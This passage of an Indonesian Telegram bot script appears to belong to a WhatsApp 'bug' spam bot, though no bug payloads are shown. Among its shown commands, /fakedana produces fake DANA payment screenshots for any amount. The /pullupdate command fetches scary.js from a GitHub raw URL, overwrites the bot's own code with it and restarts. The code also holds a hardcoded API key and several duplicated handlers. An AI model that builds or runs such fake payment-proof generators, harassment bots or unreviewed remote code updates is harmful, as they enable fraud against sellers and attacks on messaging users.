      text: "No Work",
      checked: false
    },
    {
      text: "Delay 30%",
      checked: true
    }
  )
  
  .details(
  "⚙️ Important Information",
  `
  Jika Ada Kendala Dengan Script imi Hubungi Developer @kazeenewera Saran Fitur yap
 
  `
)

  .build();

  await ctx.sendRichMessage(msg, {
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Back",
          callback_data: "back_to_start",
          style: "danger",
          icon_custom_emoji_id: ICON_BACK
        }
      ]
    ]).reply_markup
  });
});

// Tombol Back
bot.action("back_to_start", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
  
  const msg = new HTML()
  
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    
    .heading(
  1,
  "𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑼𝒔𝒆𝒓" +
  HTML.customEmoji("6129608584176076842", "🕷") +
  " 」"
)

    .paragraph(
      `𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐗𝐞𝐧𝐨𝐯𝐚 𝐒𝐢𝐥𝐞𝐧𝐭`
    + HTML.customEmoji("6093786598422353987", "👑" ) 
    )

    .divider()

    .heading(2, HTML.customEmoji("4956680567853679460", "💋") + " Bot Information")

    .table(
      [
        ["Information", "Detail"],
        ["Name", "Xenova Seventeen"],
        ["Version", "1.0 ( Rich Mode )"],
        ["Status", "🟢 Online"],
        ["System", "Auto Update"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )
  .taskList(
  { text: "Telegram Connected", checked: true },
  { text: "WhatsApp Sender Connected", checked: false },
  { text: "Bebas Spam Bug", checked: true }
)
    .divider()
    .details(
    "<tg-emoji emoji-id='5350725709679584478'>✨</tg-emoji>Important Information",
      `
  
      SCRIPT INI VVIP DAN VERSI TERBARU JIKA ADA SARAN ATAU EROR HUBUNGI DEV @kazeenewera
      `
       )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
 .audio('https://b.top4top.io/m_3858qq9s11.mp3', 'Xenova — Silent ')
    .build();


  await ctx.sendRichMessage(msg, {
  protect_content: true, 
  reply_markup: Markup.inlineKeyboard([
    [
  {
    text: "Bug Menu",
    callback_data: "holee",
    style: "danger",
    icon_custom_emoji_id: "5355021020572962395"
  },
  {
    text: "Owner Menu",
    callback_data: "p",
    style: "danger",
    icon_custom_emoji_id: "6248910861419680249"
  },
],
[
  {
    text: "Tools Menu",
    callback_data: "toolscoy",
    style: "primary",
    icon_custom_emoji_id: "5316790180936431490"
  }
],
[
  {
    text: "Developer Script",
    url: "https://t.me/gaponback",
    style: "success",
    icon_custom_emoji_id: "6104897532788215057"
  }
]
]).reply_markup
});

});
bot.command('fakedana', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const amount = textInput.trim();

    if (!amount) {
        return ctx.reply('<tg-emoji emoji-id="5352909795038880233">❌</tg-emoji> Format salah!\nGunakan: /fakedana [nominal]\n\nContoh:\n/fakedana 50000');
    }

    if (isNaN(amount)) {
        return ctx.reply('<tg-emoji emoji-id="5350357424823888008">‼️</tg-emoji>Nominal harus berupa angka saja tanpa titik/koma! (Contoh: 100000)');
    }

    await ctx.reply('S<tg-emoji emoji-id="5350595795508814391">🕓</tg-emoji>edang memproses gambar prank, mohon tunggu...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/fakedana?amount=${encodeURIComponent(amount)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `<tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>Sukses Generate Fake DANA\nNominal: Rp ${parseInt(amount).toLocaleString('id-ID')}\nGunakan dengan bijak untuk prank teman!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('<tg-emoji emoji-id="5316538964004321334">🚫</tg-emoji>Terjadi kesalahan saat mengambil data dari API.');
    }
});

import yts from "yt-search";
const APIKEY = "Btz-5d3hK";
const playCache = {};

// ... sisanya (handler /play dan callback_query)
bot.command("play", async (ctx) => {
  const chatId = ctx.chat.id;
  
  // Ambil argumen dari text
  const text = ctx.message.text || "";
  const query = text.replace(/^\/play(@\w+)?\s*/, "").trim();

  if (!query) {
    return ctx.reply(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
<tg-emoji emoji-id="6087075389899805372">🚨</tg-emoji> /play komang
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await ctx.reply(`
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Searching...</blockquote>
`, { parse_mode: "HTML" });

  try {
    const search = await yts(query);
    const videos = search.videos.slice(0, 5);

    if (!videos.length) throw new Error("Tidak ditemukan");

    playCache[chatId] = videos;

    const buttons = videos.map((v, i) => ([
      {
        text: `${v.title.length > 40 ? v.title.slice(0, 40) + "..." : v.title}`,
        callback_data: `play_${i}`,
      }
    ]));

    await ctx.telegram.editMessageText(chatId, sent.message_id, undefined, `
<blockquote><tg-emoji emoji-id="6100631470622116162">🎵</tg-emoji> Pilih Lagu:</blockquote>
<blockquote>${videos.map((v, i) => `${i + 1}. ${v.title}`).join("\n")}</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: buttons
      }
    });

  } catch (err) {
    console.log(err);
    await ctx.telegram.editMessageText(chatId, sent.message_id, undefined, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Lagu tidak ditemukan</blockquote>
`, {
      parse_mode: "HTML"
    });
  }
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  const chatId = ctx.callbackQuery.message.chat.id;
  const messageId = ctx.callbackQuery.message.message_id;

  if (!data.startsWith("play_")) return;

  const index = parseInt(data.split("_")[1]);
  const videos = playCache[chatId];

  if (!videos || !videos[index]) {
    return ctx.answerCbQuery("❌ Data expired", { show_alert: true });
  }

  const video = videos[index];

  try {
    await ctx.telegram.editMessageText(chatId, messageId, undefined, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Sending music...</blockquote>
`, {
      parse_mode: "HTML"
    });

    await ctx.answerCbQuery("⏳ Processing...");

    const res = await axios.get("https://api.betabotz.eu.org/api/download/ytmp3", {
      params: {
        url: video.url,
        apikey: `${APIKEY}`
      }
    });

    const mp3Url = res.data?.result?.mp3;
    if (!mp3Url) throw new Error("MP3 gagal");

    const audioStream = await axios.get(mp3Url, {
      responseType: "stream"
    });

    await ctx.replyWithAudio(
      { source: audioStream.data },
      {
        title: video.title,
        performer: video.author.name,
        caption: `
<blockquote><tg-emoji emoji-id="5879682959753088509">👤</tg-emoji> ${video.author.name} • 
<tg-emoji emoji-id="5843618381361581907">🕒</tg-emoji> ${video.timestamp}
<tg-emoji emoji-id="6100631470622116162">🎵</tg-emoji> ${video.title}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By Angkasa Stecu
</blockquote>
`,
        parse_mode: "HTML"
      }
    );

    delete playCache[chatId];

  } catch (err) {
    console.log(err);
    ctx.reply(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal download lagu</blockquote>
`, { parse_mode: "HTML" });
  }
});

const APIKEY_TIKTOK = "Btz-5d3hK";

bot.command("tiktok", async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

 

  if (!url) {
    return ctx.reply(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/tiktok https://vt.tiktok.com/xxxxx/</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await ctx.reply(`
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Sedang mengambil video...</blockquote>
`, { parse_mode: "HTML" });

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${encodeURIComponent(url)}&apikey=${APIKEY}`;
    const response = await axios.get(apiUrl);

    if (!response.data || !response.data.status) {
      return ctx.telegram.editMessageText(chatId, sent.message_id, undefined, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal Mengambil Video</blockquote>
`, { parse_mode: "HTML" });
    }

    const data = response.data.result;
    const videoUrl = data.video?.[0];
    const audioUrl = data.audio?.[0];

    const caption = `<blockquote><b><tg-emoji emoji-id="4970133401857163956">🎵</tg-emoji> TikTok Downloader</b>
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Caption: ${data.title || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By Angkasa Stecu</blockquote>`;

    if (videoUrl) {
      try {
        const videoRes = await axios.get(videoUrl, {
          responseType: "arraybuffer",
          headers: { "User-Agent": "Mozilla/5.0" }
        });
        const buffer = Buffer.from(videoRes.data);

        try {
          await ctx.replyWithVideo({ source: buffer }, { caption, parse_mode: "HTML" });
        } catch (errVideo) {
          console.log("SEND VIDEO FAILED, TRY DOCUMENT");
          await ctx.replyWithDocument(
            { source: buffer, filename: "tiktok.mp4" },
            { caption, parse_mode: "HTML" }
          );
        }
      } catch (err) {
        console.log("DOWNLOAD VIDEO ERROR:", err.message);
      }
    }

    if (audioUrl) {
      try {
        const audioRes = await axios.get(audioUrl, {
          responseType: "arraybuffer",
          headers: { "User-Agent": "Mozilla/5.0" }
        });

        await ctx.replyWithAudio(
          { source: Buffer.from(audioRes.data), filename: "tiktok.mp3" },
          {
            caption: `<blockquote><tg-emoji emoji-id="5355022893178696239">🎧</tg-emoji> Audio By: angkasamdbot.t.me
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Caption: ${data.title || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> Powered By: Angkasa Stecu</blockquote>`,
            parse_mode: "HTML"
          }
        );
      } catch (err) {
        console.log("AUDIO ERROR:", err.message);
      }
    }

    await ctx.telegram.deleteMessage(chatId, sent.message_id);

  } catch (err) {
    console.log("TIKTOK DL ERROR:", err.response?.data || err.message);

    await ctx.telegram.editMessageText(chatId, sent.message_id, undefined, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Terjadi kesalahan saat download</blockquote>
`, { parse_mode: "HTML" });
  }
});


const SETTINGS_PATH = './sholat.json';
const lastSent = {};

// ====== KONVERSI NAMA KOTA -> ID MYQURAN ======
// MyQuran pakai ID kota. Contoh:
// Jakarta = 1301, Bandung = 1219, Surabaya = 1439, Medan = 1211,
// Yogyakarta = 1333, Semarang = 1334, Makassar = 1544, Palembang = 1308
// Cari lengkap: https://api.myquran.com/v2/sholat/kota/semua
const KOTA_ID = {
    jakarta: "1301",
    bandung: "1219",
    surabaya: "1439",
    medan: "1211",
    yogyakarta: "1333",
    jogja: "1333",
    semarang: "1334",
    makassar: "1544",
    palembang: "1308",
    balikpapan: "1601",
    malang: "1416",
    bogor: "1218",
    depok: "1220",
    tangerang: "1217",
    bekasi: "1220",
    pekanbaru: "1309",
    padang: "1306",
    denpasar: "1634",
    // tambahkan kota lain sesuai kebutuhan
};

function getSettings() {
    try {
        if (!fs.existsSync(SETTINGS_PATH)) return {};
        return JSON.parse(fs.readFileSync(SETTINGS_PATH, 'utf8') || '{}');
    } catch {
        return {};
    }
}

function saveSettings(s) {
    try {
        fs.writeFileSync(SETTINGS_PATH, JSON.stringify(s));
    } catch (e) {
        console.error('Gagal simpan settings:', e.message);
    }
}

// ====== HELPER: axios dengan retry ======
async function axiosRetry(url, retries = 3, timeout = 20000) {
    for (let i = 0; i < retries; i++) {
        try {
            return await axios.get(url, { timeout });
        } catch (err) {
            console.log(`[RETRY ${i + 1}/${retries}] ${err.message}`);
            if (i === retries - 1) throw err;
            await new Promise(r => setTimeout(r, 1500));
        }
    }
}

// ====== AMBIL JADWAL (MyQuran + fallback aladhan) ======
async function getJadwal(kota) {
    const key = (kota || "jakarta").toLowerCase().trim();
    const id = KOTA_ID[key];

    // === Coba MyQuran dulu ===
    if (id) {
        try {
            const today = new Date();
            const yyyy = today.getFullYear();
            const mm = String(today.getMonth() + 1).padStart(2, '0');
            const dd = String(today.getDate()).padStart(2, '0');

            const url = `https://api.myquran.com/v2/sholat/jadwal/${id}/${yyyy}/${mm}/${dd}`;
            const { data } = await axiosRetry(url, 3, 20000);

            if (data?.status && data?.data?.jadwal) {
                const j = data.data.jadwal;
                return {
                    Imsak: j.imsak,
                    Fajr: j.subuh,
                    Sunrise: j.terbit,
                    Dhuhr: j.dzuhur,
                    Asr: j.ashar,
                    Maghrib: j.maghrib,
                    Isha: j.isya,
                    _source: "myquran",
                    _kota: data.data.lokasi
                };
            }
        } catch (e) {
            console.error(`[JADWAL MyQuran] ${kota}:`, e.message);
        }
    }

    // === Fallback ke aladhan ===
    try {
        const url = `https://api.aladhan.com/v1/timingsByCity?city=${encodeURIComponent(kota)}&country=Indonesia&method=20`;
        const { data } = await axiosRetry(url, 2, 25000);

        if (data?.code === 200 && data?.data?.timings) {
            const t = data.data.timings;
            return {
                Imsak: t.Imsak,
                Fajr: t.Fajr,
                Sunrise: t.Sunrise,
                Dhuhr: t.Dhuhr,
                Asr: t.Asr,
                Maghrib: t.Maghrib,
                Isha: t.Isha,
                _source: "aladhan",
                _kota: kota
            };
        }
    } catch (e) {
        console.error(`[JADWAL Aladhan] ${kota}:`, e.message);
    }

    return null;
}

// ====== HELPER: format HH:MM ======
function hhmm(str) {
    if (!str) return "-";
    return String(str).split(' ')[0].slice(0, 5);
}

// ====== COMMAND /waktusholat ======
bot.command('waktusholat', async (ctx) => {
    const chatId = ctx.chat.id.toString();
    const args = ctx.message.text.split(' ').slice(1);
    const option = args[0]?.toLowerCase();

    let settings = getSettings();
    if (!settings[chatId]) settings[chatId] = { kota: "jakarta", aktif: false };

    // Tanpa argumen: tampilkan jadwal hari ini
    if (!option) {
        const jadwal = await getJadwal(settings[chatId].kota || "jakarta");
        if (!jadwal) return ctx.reply("❌ Gagal mengambil jadwal sholat. Coba lagi nanti.");

        return ctx.reply(
`🕌 <b>JADWAL SHOLAT HARI INI</b>
📍 Kota: ${settings[chatId].kota}

Imsak:   ${hhmm(jadwal.Imsak)}
Subuh:   ${hhmm(jadwal.Fajr)}
Terbit:  ${hhmm(jadwal.Sunrise)}
Dzuhur:  ${hhmm(jadwal.Dhuhr)}
Ashar:   ${hhmm(jadwal.Asr)}
Maghrib: ${hhmm(jadwal.Maghrib)}
Isya:    ${hhmm(jadwal.Isha)}`,
            { parse_mode: "HTML" }
        );
    }

    // on / off
    if (option === "on" || option === "off") {
        settings[chatId].aktif = option === "on";
        saveSettings(settings);

        return ctx.reply(
            option === "on"
                ? "✅ Notifikasi waktu sholat diaktifkan."
                : "❌ Notifikasi waktu sholat dimatikan."
        );
    }

    // Ganti kota
    const jadwal = await getJadwal(option);
    if (!jadwal) return ctx.reply(`❌ Kota "${option}" tidak ditemukan / API sedang error.`);

    settings[chatId].kota = option;
    saveSettings(settings);

    ctx.reply(
`🕌 <b>JADWAL SHOLAT - ${option.toUpperCase()}</b>
📍 Kota berhasil disimpan.

Imsak:   ${hhmm(jadwal.Imsak)}
Subuh:   ${hhmm(jadwal.Fajr)}
Dzuhur:  ${hhmm(jadwal.Dhuhr)}
Ashar:   ${hhmm(jadwal.Asr)}
Maghrib: ${hhmm(jadwal.Maghrib)}
Isya:    ${hhmm(jadwal.Isha)}`,
        { parse_mode: "HTML" }
    );
});

// ====== NOTIFIKASI OTOMATIS ======
setInterval(async () => {
    const settings = getSettings();

    for (const chatId in settings) {
        const cfg = settings[chatId];
        if (!cfg.aktif) continue;

        const kota = cfg.kota || "jakarta";
        const jadwal = await getJadwal(kota);
        if (!jadwal) continue;

        const now = new Date();
        const jamSekarang = now.toLocaleTimeString('id-ID', {
            timeZone: 'Asia/Jakarta',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        }).replace('.', ':');

        const waktuSholat = {
            "Imsak": hhmm(jadwal.Imsak),
            "Subuh": hhmm(jadwal.Fajr),
            "Matahari Terbit": hhmm(jadwal.Sunrise),
            "Dzuhur": hhmm(jadwal.Dhuhr),
            "Ashar": hhmm(jadwal.Asr),
            "Maghrib": hhmm(jadwal.Maghrib),
            "Isya": hhmm(jadwal.Isha)
        };

        for (const [nama, waktu] of Object.entries(waktuSholat)) {
            const key = `${chatId}_${nama}`;
            if (jamSekarang === waktu && lastSent[key] !== waktu) {
                lastSent[key] = waktu;

                let pesan = nama.includes("Matahari")
                    ? "☀️ Matahari telah terbit"
                    : "Segera laksanakan sholat ya 😇";

                bot.telegram.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6271271702408204490">🟡</tg-emoji> Waktu ${nama} telah tiba!</blockquote>
${pesan}
<blockquote><tg-emoji emoji-id="5368295871131695793">⏰</tg-emoji> ${waktu}
<tg-emoji emoji-id="5318986077455795572">📍</tg-emoji> Wilayah: ${kota.charAt(0).toUpperCase() + kota.slice(1)}</blockquote>
  
    
HADIST RIWAYATNYA BUKHORI
     مَنْ تَرَكَ صَلَاةَ الْعَصْرِ فَقَدْ حَبِطَ عَمَلُهُ
Artinya: "Siapa yang meninggalkan shalat Ashar, maka amalannya telah gugur."

Semoga bermanfaat dan menjadi pengingat bagi kita semua untuk selalu menjaga shalat. 🤲 `,
                    { parse_mode: "HTML" }
                ).catch(() => {});
            }
        }
    }
}, 30000);
bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("<tg-emoji emoji-id='5352909795038880233'>❌</tg-emoji> ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("<tg-emoji emoji-id='5352909795038880233'>❌</tg-emoji> ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("<tg-emoji emoji-id='5352909795038880233'>❌</tg-emoji>☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(` <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>( <tg-emoji emoji-id="5350582150397718891">🦋</tg-emoji> ) - Connect Sender</blockquote>
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(videoUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>( ) - Connect Sender</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

const vidthumbnail = "https://files.catbox.moe/dfo13q.jpg";
bot.command("connect", async (ctx) => {
   if (ctx.from.id != OWNER_IDS) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ BASE BY GAPON ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ BASE BY GAPON ⎭ ⊰―—═⬡</pre></blockquote>
⬡ Number: ${lastPairingMessage.phoneNumber}
⬡ Pairing Code: ${lastPairingMessage.pairingCode}
⬡ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ BASE BY GAPON ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
const UPDATE_URL = "https://raw.githubusercontent.com/Unbandfoul/scary_autoupdate/refs/heads/main/scary.js";
const UPDATE_FILE_PATH = "./scary.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        file.close(() => fs.unlink(filePath, () => {}));
        return reject(new Error(`HTTP_${res.statusCode}`));
      }

      res.pipe(file);

      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => {
      file.close(() => fs.unlink(filePath, () => {}));
      reject(err);
    });
  });
}

bot.command("pullupdate", async (ctx) => {
  // CEK OWNER
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner!");
  }

  // PESAN PROSES
  const prosesMsg = new HTML()
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Sedang melakukan sinkronisasi script...") +
      "\n" + HTML.italic("Mohon tunggu beberapa saat.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script berhasil mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("Scary Death © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .heading(2, "❌ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Sinkronisasi script gagal dilakukan.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

bot.command("pullupdate", async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner!");
  }

  const thumbnailUp = "https://files.catbox.moe/xd8m5h.jpg";

  // PESAN PROSES PAKE RICH MESSAGE + FOTO
  const prosesMsg = new HTML()
    .photo(thumbnailUp, "📥 Downloading Update...")
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Sedang melakukan sinkronisasi script...") +
      "\n" + HTML.italic("Mohon tunggu beberapa saat.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .photo(thumbnailUp, "✅ Update Success!")
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script berhasil mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("Scary Death © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .photo(thumbnailUp, "❌ Update Failed!")
      .heading(2, "❌ UPDATE FAILED")
      .divider()
